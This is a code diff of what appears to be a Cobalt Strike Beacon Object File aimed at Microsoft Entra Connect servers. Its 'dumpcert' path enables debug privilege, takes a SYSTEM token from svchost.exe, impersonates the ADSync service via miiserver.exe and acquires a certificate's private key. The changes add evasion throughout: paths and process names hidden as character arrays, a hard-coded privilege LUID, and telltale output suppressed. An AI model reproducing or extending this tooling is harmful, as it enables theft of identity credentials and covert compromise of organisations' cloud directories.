@@ -12,8 +12,11 @@
 #pragma comment(lib, "legacy_stdio_definitions.lib")
 
 
-// Printf shorthand for development purposes
+// Debug builds imply verbose output
 #ifdef _DEBUG
+#ifndef VERBOSE
+#define VERBOSE
+#endif
 #include <stdio.h>
 #include <string.h>
 #include <winver.h>
@@ -41,12 +44,10 @@ DECLSPEC_IMPORT SIZE_T MSVCRT$wcslen(CONST WCHAR* str);
 DECLSPEC_IMPORT WCHAR* MSVCRT$wcsstr(CONST WCHAR* str, CONST WCHAR* strSearch);
 
 DECLSPEC_IMPORT SIZE_T MSVCRT$strlen(CONST CHAR* str);
-DECLSPEC_IMPORT CHAR* MSVCRT$strchr(CONST CHAR* str, CONST CHAR strSearch);
-DECLSPEC_IMPORT CHAR* MSVCRT$strstr(CONST CHAR* str, CONST CHAR* strSearch);
 DECLSPEC_IMPORT INT WINAPIV MSVCRT$sprintf(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...);
 DECLSPEC_IMPORT INT MSVCRT$strncmp(CONST CHAR* string1, CONST CHAR* string2, SIZE_T count);
-// USER32
-DECLSPEC_IMPORT INT WINAPIV USER32$wsprintfW(LPWSTR unnamedParam1, LPCWSTR unnamedParam2, ...);
+// MSVCRT — wide string formatting (avoids loading user32.dll)
+DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snwprintf(WCHAR* buffer, SIZE_T count, CONST WCHAR* format, ...);
 
 // ODBC32
 DECLSPEC_IMPORT BOOL ODBCCP32$SQLGetInstalledDriversW(LPSTR lpszBuf, WORD cbBufMax, WORD* pcbBufOut);
@@ -66,32 +67,23 @@ DECLSPEC_IMPORT DWORD VERSION$GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LP
 DECLSPEC_IMPORT BOOL VERSION$GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
 DECLSPEC_IMPORT BOOL VERSION$VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID* lplpBuffer, PUINT puLen);
 
-// KERNEL32 — process enumeration and file I/O for dumpcert
+// KERNEL32 — process enumeration for dumpcert
 DECLSPEC_IMPORT HANDLE KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
 DECLSPEC_IMPORT BOOL KERNEL32$Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
 DECLSPEC_IMPORT BOOL KERNEL32$Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
 DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE hObject);
-DECLSPEC_IMPORT BOOL KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
 DECLSPEC_IMPORT BOOL ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
-DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
-DECLSPEC_IMPORT BOOL KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
-DECLSPEC_IMPORT DWORD KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
 DECLSPEC_IMPORT VOID KERNEL32$GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
-DECLSPEC_IMPORT HLOCAL KERNEL32$LocalFree(HLOCAL hMem);
 
 // ADVAPI32 — token manipulation and privilege adjustment
 DECLSPEC_IMPORT BOOL ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
 DECLSPEC_IMPORT BOOL ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
 DECLSPEC_IMPORT BOOL ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
 DECLSPEC_IMPORT BOOL ADVAPI32$RevertToSelf();
-DECLSPEC_IMPORT BOOL ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
 DECLSPEC_IMPORT BOOL ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
-DECLSPEC_IMPORT BOOL ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
-DECLSPEC_IMPORT HANDLE ADVAPI32$GetCurrentThread();
 
-// CRYPT32 — DPAPI decryption and certificate store operations
-DECLSPEC_IMPORT BOOL CRYPT32$CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut);
+// CRYPT32 — certificate store operations
 DECLSPEC_IMPORT HCERTSTORE CRYPT32$CertOpenStore(LPCSTR lpszStoreProvider, DWORD dwEncodingType, ULONG_PTR hCryptProv, DWORD dwFlags, CONST void* pvPara);
 DECLSPEC_IMPORT PCCERT_CONTEXT CRYPT32$CertFindCertificateInStore(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, CONST void* pvFindPara, PCCERT_CONTEXT pPrevCertContext);
 DECLSPEC_IMPORT BOOL CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT pCertContext);
@@ -111,7 +103,6 @@ DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptGenRandom(BCRYPT_ALG_HANDLE hAlgorithm, PU
 
 // MSVCRT — additional string functions for dumpcert
 DECLSPEC_IMPORT INT MSVCRT$_wcsicmp(CONST WCHAR* string1, CONST WCHAR* string2);
-DECLSPEC_IMPORT PVOID MSVCRT$memset(PVOID dst, INT val, SIZE_T size);
 DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snprintf(CHAR* buffer, SIZE_T count, CONST CHAR* format, ...);
 
 #endif
@@ -126,13 +117,16 @@ DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snprintf(CHAR* buffer, SIZE_T count, CONST C
 
 
 // Constants
-// %ls = ODBC driver name, %ls = LocalDB instance name (ADSync for v1, ADSync2019 for v2+)
-// The \\.\\instancename format (resolves to \.\instancename) is required by the ODBC driver for LocalDB named instances
-#define CONNECTION_STRING_FMT L"Driver={%ls};Server=(LocalDB)\\.\\%ls;Database=ADSync;Trusted_Connection=yes"
 
 // Utility macro's / constants
 #define BofHeapAlloc(size) API(KERNEL32, HeapAlloc)(API(KERNEL32, GetProcessHeap)(), HEAP_ZERO_MEMORY, size)
 #define BofHeapFree(buf) API(KERNEL32, HeapFree)(API(KERNEL32, GetProcessHeap)(), NULL, buf)
+
+#ifdef VERBOSE
+#define VerbosePrintf(...) BeaconPrintf(__VA_ARGS__)
+#else
+#define VerbosePrintf(...) ((void)0)
+#endif
 #define IS_SQL_SUCCESS(r) (r == SQL_SUCCESS || r == SQL_SUCCESS_WITH_INFO)
 
 #define CONNECT_TIMEOUT 5
@@ -148,43 +142,7 @@ DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snprintf(CHAR* buffer, SIZE_T count, CONST C
 #define ENTRACONNECT_ABA_PREVIEW_MINOR 4
 #define ENTRACONNECT_ABA_GA_MINOR      6
 
-#define CERT_DIR        L"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates"
-#define CERT_DIR_SEARCH L"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\*"
 
-// LocalDB instances are stored per-user under the ADSync service profile.
-// Enumerating with ADSync* discovers the actual instance name (ADSync, ADSync2019, ADSync2022, etc.)
-// regardless of the installed version, avoiding hardcoded version->instance mappings.
-#define LOCALDB_INSTANCES_SEARCH L"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Local\\Microsoft\\Microsoft SQL Server Local DB\\Instances\\ADSync*"
-
-#define QUERY_PRIVATE_CONFIG L"SELECT private_configuration_xml FROM mms_management_agent;"
-
-// --- dumpcert constants ---
-// CNG key blob candidate directories. The private key may be in the ADSync service
-// profile (Roaming or Local), the machine-level CNG store, or the SystemCertificates
-// Keys subdir depending on the Entra Connect version and key storage provider.
-// We try each in order until we find one that exists.
-#define CNG_KEY_CANDIDATES_COUNT 4
-
-// DPAPI entropy strings — these include the explicit null terminator as part of the entropy.
-// The C# code does Encoding.UTF8.GetBytes("6jnkd5J3ZdQDtrsu\0") which produces 18 bytes.
-#define DPAPI_ENTROPY_PRIVPROPS    "6jnkd5J3ZdQDtrsu"   // 17 chars + \0 = 18 bytes
-#define DPAPI_ENTROPY_PRIVPROPS_LEN 18
-#define DPAPI_ENTROPY_PRIVKEY      "xT5rZW5qVVbrvpuA"   // 17 chars + \0 = 18 bytes
-#define DPAPI_ENTROPY_PRIVKEY_LEN   18
-
-// CNG key blob header (44 bytes, packed)
-#pragma pack(push, 1)
-typedef struct {
-    DWORD Version;
-    DWORD Unknown1;
-    DWORD NameLen;          // Unicode key name length in bytes
-    DWORD Type;
-    DWORD PublicPropertiesLen;
-    DWORD PrivatePropertiesLen;
-    DWORD PrivateKeyLen;
-    BYTE  Unknown2[16];
-} CNG_KEY_HEADER;
-#pragma pack(pop)
 
 // BCRYPT_PKCS1_PADDING_INFO — for RSA PKCS#1 v1.5 signature
 typedef struct {
@@ -222,8 +180,6 @@ typedef struct {
 // Base64 encoding table
 static CONST CHAR b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-// JWT audience format
-#define JWT_AUD_FMT "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
 
 // Max sizes for JWT components
 #define JWT_MAX_HEADER  256
@@ -332,7 +288,7 @@ CONST SQLWCHAR* get_last_sql_error(SQLHDBC sqlConnHandle, SQLRETURN sqlResult) {
     static SQLWCHAR message[SQL_MAX_MESSAGE_LENGTH + sizeof(format) + sizeof(sqlState) + 8 + 8];
 
     API(ODBC32, SQLGetDiagRecW)(SQL_HANDLE_DBC, sqlConnHandle, 1, sqlState, &nativeError, errorMessage, SQL_MAX_MESSAGE_LENGTH, &messageLength);
-    API(USER32, wsprintfW)(message, format, sqlResult, sqlState, nativeError, errorMessage);
+    API(MSVCRT, _snwprintf)(message, sizeof(message) / sizeof(message[0]) - 1, format, sqlResult, sqlState, nativeError, errorMessage);
     return message;
 }
 
@@ -344,7 +300,8 @@ CONST WCHAR* find_localdb_instance() {
     static WCHAR instanceName[260];
     WIN32_FIND_DATAW findData = { 0 };
     INT i;
-    HANDLE hFind = API(KERNEL32, FindFirstFileW)(LOCALDB_INSTANCES_SEARCH, &findData);
+    WCHAR wLdbSearch[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','M','i','c','r','o','s','o','f','t','\\','M','i','c','r','o','s','o','f','t',' ','S','Q','L',' ','S','e','r','v','e','r',' ','L','o','c','a','l',' ','D','B','\\','I','n','s','t','a','n','c','e','s','\\','A','D','S','y','n','c','*',0 };
+    HANDLE hFind = API(KERNEL32, FindFirstFileW)(wLdbSearch, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
         return NULL;
     }
@@ -373,12 +330,12 @@ CONST WCHAR* find_localdb_instance() {
 CONST WCHAR* resolve_localdb_instance(CONST WCHAR* override) {
     CONST WCHAR* discovered;
     if (override) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Using specified LocalDB instance: %ls\n", override);
+        VerbosePrintf(CALLBACK_OUTPUT, "Using specified instance: %ls\n", override);
         return override;
     }
     discovered = find_localdb_instance();
     if (discovered) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Discovered LocalDB instance: %ls\n", discovered);
+        VerbosePrintf(CALLBACK_OUTPUT, "Discovered instance: %ls\n", discovered);
         return discovered;
     }
     return NULL;
@@ -387,10 +344,9 @@ CONST WCHAR* resolve_localdb_instance(CONST WCHAR* override) {
 
 // Reads Entra Connect version info into ver. Returns FALSE if executable not found or unreadable.
 BOOL read_entra_version(ENTRACONNECT_VERSION* ver) {
-    CONST WCHAR* candidatePaths[] = {
-        L"C:\\Program Files\\Microsoft Azure Active Directory Connect\\ADSync\\Bin\\ADSync.exe",
-        L"C:\\Program Files\\Microsoft Azure Active Directory Connect\\AzureADConnect.exe",
-    };
+    WCHAR wPath1[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','M','i','c','r','o','s','o','f','t',' ','A','z','u','r','e',' ','A','c','t','i','v','e',' ','D','i','r','e','c','t','o','r','y',' ','C','o','n','n','e','c','t','\\','A','D','S','y','n','c','\\','B','i','n','\\','A','D','S','y','n','c','.','e','x','e',0 };
+    WCHAR wPath2[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','M','i','c','r','o','s','o','f','t',' ','A','z','u','r','e',' ','A','c','t','i','v','e',' ','D','i','r','e','c','t','o','r','y',' ','C','o','n','n','e','c','t','\\','A','z','u','r','e','A','D','C','o','n','n','e','c','t','.','e','x','e',0 };
+    CONST WCHAR* candidatePaths[] = { wPath1, wPath2 };
     CONST INT numPaths = 2;
 
     ver->found    = FALSE;
@@ -494,24 +450,21 @@ BOOL enable_debug_privilege() {
         return FALSE;
     }
 
-    if (!API(ADVAPI32, LookupPrivilegeValueA)(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to lookup SeDebugPrivilege: %d\n", API(KERNEL32, GetLastError)());
-        API(KERNEL32, CloseHandle)(hToken);
-        return FALSE;
-    }
+    tp.Privileges[0].Luid.LowPart = 20;
+    tp.Privileges[0].Luid.HighPart = 0;
 
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
     if (!API(ADVAPI32, AdjustTokenPrivileges)(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SeDebugPrivilege: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable privilege: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hToken);
         return FALSE;
     }
 
     // AdjustTokenPrivileges can return success but not actually enable the privilege
     if (API(KERNEL32, GetLastError)() == ERROR_NOT_ALL_ASSIGNED) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] SeDebugPrivilege not available on this token. Are you elevated/local admin?\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Required privilege not available. Are you elevated/local admin?\n");
         API(KERNEL32, CloseHandle)(hToken);
         return FALSE;
     }
@@ -547,64 +500,32 @@ HANDLE impersonate_adsync() {
     HANDLE hAdsyncDupToken = NULL;
     PROCESSENTRY32W pe = { 0 };
     DWORD adsyncPid = 0;
-    DWORD svchostPid = 0;
+    BOOL gotSystem = FALSE;
 
-    // ---- Stage 0: Enumerate processes to find both svchost.exe and miiserver.exe ----
+    WCHAR wMii[] = { 'm','i','i','s','e','r','v','e','r','.','e','x','e',0 };
+    WCHAR wSvc[] = { 's','v','c','h','o','s','t','.','e','x','e',0 };
+
+    // ---- Single-pass enumeration: find target PID and SYSTEM token together ----
     hSnapshot = API(KERNEL32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot failed: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Process snapshot failed: %d\n", API(KERNEL32, GetLastError)());
         return NULL;
     }
 
     pe.dwSize = sizeof(PROCESSENTRY32W);
     if (!API(KERNEL32, Process32FirstW)(hSnapshot, &pe)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Process32FirstW failed: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Process enumeration failed: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hSnapshot);
         return NULL;
     }
 
     do {
-        if (adsyncPid == 0 && API(MSVCRT, _wcsicmp)(pe.szExeFile, L"miiserver.exe") == 0) {
+        if (adsyncPid == 0 && API(MSVCRT, _wcsicmp)(pe.szExeFile, wMii) == 0) {
             adsyncPid = pe.th32ProcessID;
         }
-        if (svchostPid == 0 && API(MSVCRT, _wcsicmp)(pe.szExeFile, L"svchost.exe") == 0) {
-            // Take the first svchost.exe — they all run as SYSTEM (or LOCAL/NETWORK SERVICE,
-            // but we verify the token below). If this one isn't SYSTEM we'll keep looking.
-            svchostPid = pe.th32ProcessID;
-        }
-    } while (API(KERNEL32, Process32NextW)(hSnapshot, &pe));
 
-    // If first svchost wasn't SYSTEM, we may need to try others — re-enumerate below
-    API(KERNEL32, CloseHandle)(hSnapshot);
-
-    if (adsyncPid == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find miiserver.exe (ADSync service). Is the service running?\n");
-        return NULL;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found miiserver.exe (PID: %d)\n", adsyncPid);
-
-    if (svchostPid == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find any svchost.exe process\n");
-        return NULL;
-    }
-
-    // ---- Stage 1: Steal SYSTEM token from svchost.exe ----
-    // Try svchost.exe instances until we get one running as SYSTEM.
-    // Re-enumerate the full process list so we can try multiple.
-    hSnapshot = API(KERNEL32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot failed: %d\n", API(KERNEL32, GetLastError)());
-        return NULL;
-    }
-
-    pe.dwSize = sizeof(PROCESSENTRY32W);
-    BOOL gotSystem = FALSE;
-
-    if (API(KERNEL32, Process32FirstW)(hSnapshot, &pe)) {
-        do {
-            if (API(MSVCRT, _wcsicmp)(pe.szExeFile, L"svchost.exe") != 0) continue;
-
-            hProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+        if (!gotSystem && API(MSVCRT, _wcsicmp)(pe.szExeFile, wSvc) == 0) {
+            hProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
             if (!hProcess) continue;
 
             if (!API(ADVAPI32, OpenProcessToken)(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
@@ -613,46 +534,47 @@ HANDLE impersonate_adsync() {
                 continue;
             }
 
-            // Verify this is a SYSTEM token by checking TokenUser
             BYTE tokenUserBuf[64];
             DWORD retLen = 0;
             if (API(ADVAPI32, GetTokenInformation)(hToken, TokenUser, tokenUserBuf, sizeof(tokenUserBuf), &retLen)) {
                 TOKEN_USER* pTokenUser = (TOKEN_USER*)tokenUserBuf;
-                // SYSTEM SID is S-1-5-18. Check the last sub-authority == 18 and sub-authority count == 1
                 SID* pSid = (SID*)pTokenUser->User.Sid;
                 if (pSid->SubAuthorityCount == 1 && pSid->SubAuthority[0] == 18) {
-                    // Confirmed SYSTEM
                     gotSystem = TRUE;
-                    svchostPid = pe.th32ProcessID;
-                    break;
+                    API(KERNEL32, CloseHandle)(hProcess);
+                    hProcess = NULL;
                 }
             }
 
-            // Not SYSTEM — close and try next
-            API(KERNEL32, CloseHandle)(hToken);
-            hToken = NULL;
-            API(KERNEL32, CloseHandle)(hProcess);
-            hProcess = NULL;
-        } while (API(KERNEL32, Process32NextW)(hSnapshot, &pe));
-    }
+            if (!gotSystem) {
+                API(KERNEL32, CloseHandle)(hToken);
+                hToken = NULL;
+                API(KERNEL32, CloseHandle)(hProcess);
+                hProcess = NULL;
+            }
+        }
+    } while (API(KERNEL32, Process32NextW)(hSnapshot, &pe));
 
     API(KERNEL32, CloseHandle)(hSnapshot);
 
-    if (!gotSystem || !hToken) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Could not obtain a SYSTEM token from any svchost.exe instance\n");
+    if (adsyncPid == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Target service process not found. Is the service running?\n");
         if (hToken) API(KERNEL32, CloseHandle)(hToken);
-        if (hProcess) API(KERNEL32, CloseHandle)(hProcess);
+        return NULL;
+    }
+    VerbosePrintf(CALLBACK_OUTPUT, "[*] Found target process (PID: %d)\n", adsyncPid);
+
+    if (!gotSystem || !hToken) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not obtain a SYSTEM token from any donor process\n");
+        if (hToken) API(KERNEL32, CloseHandle)(hToken);
         return NULL;
     }
 
-    API(KERNEL32, CloseHandle)(hProcess);
-    hProcess = NULL;
-
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained SYSTEM token from svchost.exe (PID: %d)\n", svchostPid);
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Obtained SYSTEM token\n");
 
     // Duplicate and impersonate the SYSTEM token
-    if (!API(ADVAPI32, DuplicateTokenEx)(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (SYSTEM) failed: %d\n", API(KERNEL32, GetLastError)());
+    if (!API(ADVAPI32, DuplicateTokenEx)(hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (stage 1) failed: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hToken);
         return NULL;
     }
@@ -660,25 +582,25 @@ HANDLE impersonate_adsync() {
     hToken = NULL;
 
     if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hDupToken)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser (SYSTEM) failed: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Impersonation (stage 1) failed: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hDupToken);
         return NULL;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonating SYSTEM\n");
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Impersonating SYSTEM\n");
 
     // ---- Stage 2: As SYSTEM, open miiserver.exe token ----
     // SYSTEM has full access to all token DACLs on the box.
-    hAdsyncProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, adsyncPid);
+    hAdsyncProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, adsyncPid);
     if (!hAdsyncProcess) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess on miiserver.exe failed as SYSTEM: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
         API(ADVAPI32, RevertToSelf)();
         API(KERNEL32, CloseHandle)(hDupToken);
         return NULL;
     }
 
     if (!API(ADVAPI32, OpenProcessToken)(hAdsyncProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hAdsyncToken)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken on miiserver.exe failed as SYSTEM: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hAdsyncProcess);
         API(ADVAPI32, RevertToSelf)();
         API(KERNEL32, CloseHandle)(hDupToken);
@@ -689,8 +611,8 @@ HANDLE impersonate_adsync() {
     hAdsyncProcess = NULL;
 
     // Duplicate the ADSync token
-    if (!API(ADVAPI32, DuplicateTokenEx)(hAdsyncToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hAdsyncDupToken)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (ADSync) failed: %d\n", API(KERNEL32, GetLastError)());
+    if (!API(ADVAPI32, DuplicateTokenEx)(hAdsyncToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hAdsyncDupToken)) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hAdsyncToken);
         API(ADVAPI32, RevertToSelf)();
         API(KERNEL32, CloseHandle)(hDupToken);
@@ -706,45 +628,13 @@ HANDLE impersonate_adsync() {
     hDupToken = NULL;
 
     if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hAdsyncDupToken)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser (ADSync) failed: %d\n", API(KERNEL32, GetLastError)());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Impersonation (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
         API(KERNEL32, CloseHandle)(hAdsyncDupToken);
         return NULL;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonating NT SERVICE\\ADSync\n");
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Impersonation complete\n");
     return hAdsyncDupToken;
-}
-
-// Read a file from disk into a heap-allocated buffer. Returns NULL on failure.
-// Sets *outSize to the number of bytes read.
-BYTE* read_file_bytes(CONST WCHAR* path, DWORD* outSize) {
-    HANDLE hFile = API(KERNEL32, CreateFileW)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return NULL;
-    }
-
-    DWORD fileSize = API(KERNEL32, GetFileSize)(hFile, NULL);
-    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
-        API(KERNEL32, CloseHandle)(hFile);
-        return NULL;
-    }
-
-    BYTE* buf = BofHeapAlloc(fileSize);
-    if (!buf) {
-        API(KERNEL32, CloseHandle)(hFile);
-        return NULL;
-    }
-
-    DWORD bytesRead = 0;
-    if (!API(KERNEL32, ReadFile)(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
-        BofHeapFree(buf);
-        API(KERNEL32, CloseHandle)(hFile);
-        return NULL;
-    }
-
-    API(KERNEL32, CloseHandle)(hFile);
-    *outSize = fileSize;
-    return buf;
 }
 
 // Convert a hex character to its nibble value (0-15). Returns -1 on invalid input.
@@ -891,7 +781,7 @@ void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* ten
     if (!enable_debug_privilege()) {
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeDebugPrivilege enabled\n");
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Privilege enabled\n");
 
     // ---- Step 3: Impersonate ADSync (single-hop via miiserver.exe) ----
     hImpToken = impersonate_adsync();
@@ -909,7 +799,7 @@ void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* ten
         BeaconPrintf(CALLBACK_ERROR, "[-] CertOpenStore(MY) failed: %d\n", API(KERNEL32, GetLastError)());
         goto dumpcert_cleanup;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened ADSync user certificate store\n");
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Opened certificate store\n");
 
     CRYPT_HASH_BLOB hashBlob;
     hashBlob.cbData = 20;
@@ -927,7 +817,7 @@ void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* ten
             thumbprint, API(KERNEL32, GetLastError)());
         goto dumpcert_cleanup;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found certificate with thumbprint %s\n", thumbprint);
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Found certificate\n");
 
     // ---- Step 5: Acquire the NCrypt private key handle ----
     DWORD dwKeySpec = 0;
@@ -941,21 +831,21 @@ void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* ten
         BeaconPrintf(CALLBACK_ERROR, "[-] CryptAcquireCertificatePrivateKey failed: %d\n", API(KERNEL32, GetLastError)());
         goto dumpcert_cleanup;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Acquired NCrypt private key handle (KeySpec=%d)\n", dwKeySpec);
+    VerbosePrintf(CALLBACK_OUTPUT, "[+] Acquired private key handle\n");
 
